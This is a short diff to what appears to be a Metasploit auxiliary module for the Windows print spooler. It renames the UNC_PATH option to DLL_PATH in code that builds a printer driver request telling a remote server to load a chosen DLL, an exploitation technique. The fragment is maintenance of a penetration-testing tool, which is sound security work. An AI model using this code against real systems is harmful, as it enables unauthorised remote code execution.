@@ -274,7 +274,7 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptPort.new('RPORT', [ false, 'The netlogon RPC port' ]),
-        OptString.new('UNC_PATH', [ true, 'The UNC path the the DLL that the server should load' ]),
+        OptString.new('DLL_PATH', [ true, 'The path to the DLL that the server should load' ])
       ]
     )
   end
@@ -322,7 +322,7 @@ class MetasploitModule < Msf::Auxiliary
     config_directory = get_printer_driver_directory(environment)
     vprint_status("Using directory: #{config_directory}")
 
-    filename = datastore['UNC_PATH'].rpartition('\\').last
+    filename = datastore['DLL_PATH'].rpartition('\\').last
     container = PrintSystem::DriverContainer.new(
       level: 2,
       tag: 2,
@@ -337,7 +337,7 @@ class MetasploitModule < Msf::Auxiliary
         p_name: "#{Rex::Text.rand_text_alpha_upper(2..4)} #{Rex::Text.rand_text_numeric(2..3)}",
         p_environment: environment,
         p_driver_path: driver_path,
-        p_data_file: datastore['UNC_PATH'],
+        p_data_file: datastore['DLL_PATH'],
         p_config_file: 'C:\\Windows\\System32\\kernel32.dll'
       )
     )
